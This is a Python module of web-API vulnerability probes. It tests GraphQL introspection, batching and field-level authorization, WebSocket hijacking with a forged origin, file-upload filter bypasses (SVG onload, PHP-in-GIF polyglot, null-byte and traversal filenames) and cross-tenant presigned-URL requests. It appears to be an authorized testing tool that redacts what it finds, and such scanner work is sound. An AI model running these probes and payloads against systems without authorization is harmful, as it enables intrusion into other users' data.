#!/usr/bin/env python3
"""API-surface primitives — GraphQL (introspection, field authz, batching, depth), WebSocket auth
and origin, file-upload validation, signed-URL abuse.
"""
from __future__ import annotations

import io
import json
import re
from urllib.parse import urlsplit

from . import Ctx, ProbeResult, TIMEOUT, blocked, primitive, requests, send, shape

GQL_PATHS = ("/graphql", "/api/graphql", "/v1/graphql", "/query")


def _gql(base: str, endpoint: str, query: str, ctx: Ctx | None = None, identity: str = ""):
    return send("POST", f"{base}{endpoint}", ctx, identity,
                json={"query": query}, headers={"Content-Type": "application/json"})


@primitive("graphql_introspection", group="E", cwe="CWE-200")
def graphql_introspection(base: str, endpoint: str = "/graphql",
                          ctx: Ctx | None = None) -> ProbeResult:
    """Schema exposed in production — and, when it isn't, whether suggestions leak it anyway."""
    ctx = ctx or Ctx()
    try:
        r = _gql(base, endpoint, "{__schema{queryType{name} types{name}}}", ctx)
    except requests.RequestException as e:
        return ProbeResult("graphql_introspection", False, endpoint, detail=str(e))
    if r.status_code < 400 and '"__schema"' in (r.text or ""):
        try:
            n = len(json.loads(r.text)["data"]["__schema"].get("types") or [])
        except Exception:                              # noqa: BLE001
            n = 0
        return ProbeResult("graphql_introspection", True, endpoint, "__schema", r.status_code,
                           f"introspection is enabled — {n} types returned; this is the endpoint "
                           f"inventory for the whole API",
                           {"types": n, "snippet": (r.text or "")[:300]})
    # clairvoyance: "Did you mean" suggestions rebuild the schema even with introspection off
    try:
        r2 = _gql(base, endpoint, "{ aaaaaaaa }", ctx)
        if re.search(r"(?i)did you mean", r2.text or ""):
            return ProbeResult("graphql_introspection", True, endpoint, "field suggestion", r2.status_code,
                               "introspection is disabled but field suggestions are on — the schema "
                               "is recoverable a field at a time (clairvoyance)",
                               {"snippet": (r2.text or "")[:300]})
    except requests.RequestException:
        pass
    return ProbeResult("graphql_introspection", False, endpoint, detail="introspection disabled")


@primitive("graphql_batching", group="E", cwe="CWE-770")
def graphql_batching(base: str, endpoint: str = "/graphql", ctx: Ctx | None = None) -> ProbeResult:
    """Aliasing and array batching defeat per-request rate limits — 100 attempts, one HTTP request."""
    ctx = ctx or Ctx()
    field = ctx.opts.get("field", "user")
    arg = ctx.opts.get("arg", "id")
    aliases = " ".join(f"a{i}: {field}({arg}: {i}) {{ id }}" for i in range(1, 26))
    try:
        r = _gql(base, endpoint, "{ " + aliases + " }", ctx)
    except requests.RequestException as e:
        return ProbeResult("graphql_batching", False, endpoint, detail=str(e))
    if r.status_code < 400:
        # Count aliases the server ACCEPTED AND EXECUTED, not just the ones that returned an object.
        # `"a7": null` still cost a resolver call — on a login mutation that is a password attempt,
        # which is the whole reason batching defeats rate limits.
        accepted = len(re.findall(r'"a\d+"\s*:', r.text or ""))
        resolved = len(re.findall(r'"a\d+"\s*:\s*\{', r.text or ""))
        if accepted >= 10:
            return ProbeResult("graphql_batching", True, endpoint,
                               f"{accepted} aliases in one request", r.status_code,
                               f"{accepted} aliased operations executed in a single HTTP request "
                               f"({resolved} returned data) — per-request rate limits and account "
                               f"lockouts do not apply to any of them",
                               {"aliases_accepted": accepted, "aliases_resolved": resolved})
    # array batching
    try:
        rb = send("POST", f"{base}{endpoint}", ctx, "",
                  json=[{"query": "{__typename}"} for _ in range(10)],
                  headers={"Content-Type": "application/json"})
        if rb.status_code < 400 and (rb.text or "").lstrip().startswith("["):
            return ProbeResult("graphql_batching", True, endpoint, "array batch x10", rb.status_code,
                               "array-form query batching is accepted — one request carries N operations",
                               {"snippet": (rb.text or "")[:200]})
    except requests.RequestException:
        pass
    return ProbeResult("graphql_batching", False, endpoint, detail="batching/aliasing constrained")


@primitive("graphql_field_authz", group="A", cwe="CWE-863",
           needs="two identities (owner + other)")
def graphql_field_authz(base: str, endpoint: str = "/graphql", ctx: Ctx | None = None) -> ProbeResult:
    """The object check passes and the nested field resolver has none — the highest-yield GraphQL bug."""
    ctx = ctx or Ctx()
    if "other" not in ctx.identities:
        return blocked("graphql_field_authz", endpoint,
                       "needs a second identity to request another principal's fields as")
    field = ctx.opts.get("field", "user")
    arg = ctx.opts.get("arg", "id")
    victim = ctx.opts.get("victim_id", "1")
    sensitive = [f.strip() for f in str(ctx.opts.get(
        "sensitive", "email,resetToken,passwordHash,phone,apiKey,token,ssn,address")).split(",")]
    for s in sensitive:
        q = f"{{ {field}({arg}: {victim}) {{ id {s} }} }}"
        try:
            r = _gql(base, endpoint, q, ctx, "other")
        except requests.RequestException:
            continue
        if r.status_code >= 400 or '"errors"' in (r.text or ""):
            continue
        m = re.search(rf'"{re.escape(s)}"\s*:\s*"([^"]+)"', r.text or "")
        if m and m.group(1) not in ("", "null"):
            return ProbeResult("graphql_field_authz", True, endpoint, q, r.status_code,
                               f"a second identity read the sensitive field {s!r} on another "
                               f"principal's object — no field-level authorization",
                               {"field": s, "query": q,
                                "value_prefix": m.group(1)[:4] + "<REDACTED>",
                                "note": "stopped at one record; value redacted"})
    return ProbeResult("graphql_field_authz", False, endpoint,
                       detail=f"none of {len(sensitive)} sensitive fields resolved cross-principal",
                       evidence={"enumerated_fields": sensitive})


@primitive("ws_auth", group="E", cwe="CWE-862")
def ws_auth(base: str, endpoint: str = "/ws", ctx: Ctx | None = None) -> ProbeResult:
    """Connect with no credentials and from a foreign Origin; read a frame we shouldn't get.

    A WebSocket handshake carries cookies and has no preflight, so a missing Origin check is
    cross-site WebSocket hijacking.
    """
    ctx = ctx or Ctx()
    try:
        import websockets  # noqa: F401
        from websockets.sync.client import connect
    except ImportError:
        return blocked("ws_auth", endpoint, "websockets library unavailable")
    u = urlsplit(base)
    ws_url = f"{'wss' if u.scheme == 'https' else 'ws'}://{u.netloc}{endpoint}"
    cred = ctx.identities.get("owner", "")

    findings = []
    # 1) fully unauthenticated
    try:
        with connect(ws_url, open_timeout=6, close_timeout=2) as ws:
            ws.send(json.dumps({"action": "subscribe", "room": ctx.opts.get("room", "1")}))
            msg = ws.recv(timeout=4)
            if msg:
                findings.append(("unauthenticated", str(msg)[:200]))
    except Exception:                                  # noqa: BLE001 - refused connections are the pass case
        pass
    # 2) authenticated but from a foreign origin (CSWSH)
    if cred and not findings:
        try:
            with connect(ws_url, additional_headers={"Cookie": cred,
                                                     "Origin": "https://evil.example"},
                         open_timeout=6, close_timeout=2) as ws:
                ws.send(json.dumps({"action": "subscribe", "room": ctx.opts.get("room", "1")}))
                msg = ws.recv(timeout=4)
                if msg:
                    findings.append(("foreign-origin with session cookie", str(msg)[:200]))
        except Exception:                              # noqa: BLE001
            pass

    if findings:
        how, sample = findings[0]
        return ProbeResult("ws_auth", True, endpoint, how, 0,
                           f"the socket delivered data to a {how} connection",
                           {"how": how, "frame": sample, "url": ws_url})
    return ProbeResult("ws_auth", False, endpoint,
                       detail="handshake rejected without credentials and from a foreign origin")


@primitive("upload_bypass", group="C", cwe="CWE-434", needs="an upload endpoint + a read-back URL")
def upload_bypass(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Guard ladder, confirmed by fetching the file back and reading how it is SERVED.

    Storing a file is not the finding; the app serving it as active content from its own origin is.
    """
    ctx = ctx or Ctx()
    ident = "owner" if "owner" in ctx.identities else ""
    marker = ctx.marker or "probe-9c2f"
    field = ctx.opts.get("field", "file")
    svg = (f'<svg xmlns="http://www.w3.org/2000/svg" onload="1"><text>{marker}</text></svg>').encode()
    gif_poly = b"GIF89a;\n<?php echo '" + marker.encode() + b"'; ?>"
    cases = [
        (f"{marker}.svg", "image/svg+xml", svg, "SVG is active content in the same origin"),
        (f"{marker}.html", "text/html", f"<b>{marker}</b>".encode(), "HTML served from the origin"),
        (f"{marker}.png.html", "image/png", f"<b>{marker}</b>".encode(), "double extension"),
        (f"{marker}.pHtMl", "image/png", f"<b>{marker}</b>".encode(), "case-varied extension"),
        (f"{marker}.php", "image/gif", gif_poly, "GIF89a polyglot with a forged Content-Type"),
        (f"{marker}.png\x00.html", "image/png", f"<b>{marker}</b>".encode(), "null-byte truncation"),
        (f"../{marker}.txt", "text/plain", marker.encode(), "traversal in the filename"),
    ]
    for name, ctype, blob, why in cases:
        try:
            r = send("POST", f"{base}{endpoint}", ctx, ident,
                     files={field: (name, io.BytesIO(blob), ctype)})
        except requests.RequestException:
            continue
        if r.status_code >= 400:
            continue
        m = re.search(r'"?(?:url|path|location|file|src)"?\s*[:=]\s*"?([^",\s}]+)', r.text or "")
        back = m.group(1) if m else f"/uploads/{name}"
        fetch_url = back if back.startswith("http") else f"{base}{back}"
        try:
            g = requests.get(fetch_url, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if g.status_code >= 400 or marker not in (g.text or ""):
            continue
        served = (g.headers.get("Content-Type", "") or "").split(";")[0].lower()
        disp = g.headers.get("Content-Disposition", "")
        active = served in ("text/html", "image/svg+xml", "application/xhtml+xml",
                            "application/javascript", "text/javascript")
        if active and "attachment" not in disp.lower():
            return ProbeResult("upload_bypass", True, endpoint, name, g.status_code,
                               f"{why}: stored and served back inline as {served} from the "
                               f"application's own origin",
                               {"filename": name, "sent_content_type": ctype,
                                "served_content_type": served, "url": fetch_url,
                                "content_disposition": disp})
    return ProbeResult("upload_bypass", False, endpoint,
                       detail=f"all {len(cases)} guard-bypass variants rejected or served inertly",
                       evidence={"enumerated": [c[0] for c in cases]})


@primitive("signed_url_abuse", group="C", cwe="CWE-639", needs="a presign endpoint")
def signed_url_abuse(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Ask the server to sign a key outside your own prefix. The signature IS the finding."""
    ctx = ctx or Ctx()
    ident = "owner" if "owner" in ctx.identities else ""
    marker = ctx.marker or "probe-9c2f"
    keys = [f"../other-tenant/{marker}.txt", f"/{marker}.txt",
            f"../../static/js/{marker}.js", f"tenant-2/{marker}.txt"]
    for key in keys:
        for field in ("key", "path", "filename", "object", "name"):
            try:
                r = send("POST", f"{base}{endpoint}", ctx, ident,
                         json={field: key, "contentType": "text/plain"})
            except requests.RequestException:
                continue
            if r.status_code >= 400:
                continue
            body = r.text or ""
            if re.search(r"(?i)signature=|x-amz-signature|x-goog-signature|se=|sig=", body):
                return ProbeResult("signed_url_abuse", True, endpoint, f"{field}={key}",
                                   r.status_code,
                                   "the server signed an upload URL for a key outside the caller's "
                                   "own prefix — the storage layer will honour it (the PUT was not "
                                   "performed)",
                                   {"field": field, "key": key,
                                    "snippet": body[:200],
                                    "note": "signature obtained only; no object was written"})
    return ProbeResult("signed_url_abuse", False, endpoint,
                       detail="presign refuses keys outside the caller's prefix")
